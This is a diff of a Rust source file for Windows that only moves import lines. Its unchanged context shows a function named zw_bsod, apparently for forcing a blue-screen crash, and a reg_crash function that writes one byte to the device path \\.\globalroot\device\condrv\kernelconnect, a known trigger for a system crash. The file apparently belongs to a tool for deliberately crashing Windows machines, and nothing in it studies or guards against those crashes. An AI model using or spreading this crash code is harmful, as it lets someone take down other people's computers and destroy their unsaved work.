@@ -1,3 +1,4 @@
+
 use winapi::ctypes::c_ulong;
 use winapi::shared::minwindef::{HMODULE, ULONG};
 use winapi::shared::ntdef::{NTSTATUS, BOOLEAN};
@@ -7,6 +8,11 @@ use winreg::enums::HKEY_LOCAL_MACHINE;
 use winreg::RegKey;
 use winreg::enums::REG_PROCESS_APPKEY;
 use anyhow::Result;
+use std::fs::OpenOptions;
+use std::io::Write;
+use core::ptr::null;
+use winapi::shared::ntstatus::STATUS_FLOAT_MULTIPLE_FAULTS;
+
 
 const SHUTDOWN_PRIVILEGE: ULONG = 19;
 const OPTION_SHUTDOWN: ULONG = 6;
@@ -80,6 +86,7 @@ pub fn zw_bsod() {
     }
 }
 
+
 // pub fn mount_hive(hive_path: &str) -> Result<()> {
 //     let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
 //     let subkey = r"System\CurrentControlSet\Control\hivelist";
@@ -90,8 +97,6 @@ pub fn zw_bsod() {
 //     Ok(())
 // }
 
-use std::fs::OpenOptions;
-use std::io::Write;
 
 pub fn reg_crash() {
     let path = r"\\.\globalroot\device\condrv\kernelconnect";
@@ -101,5 +106,8 @@ pub fn reg_crash() {
 
     file.unwrap().write_all(b" ").unwrap();
 }
+
+
+
 
     
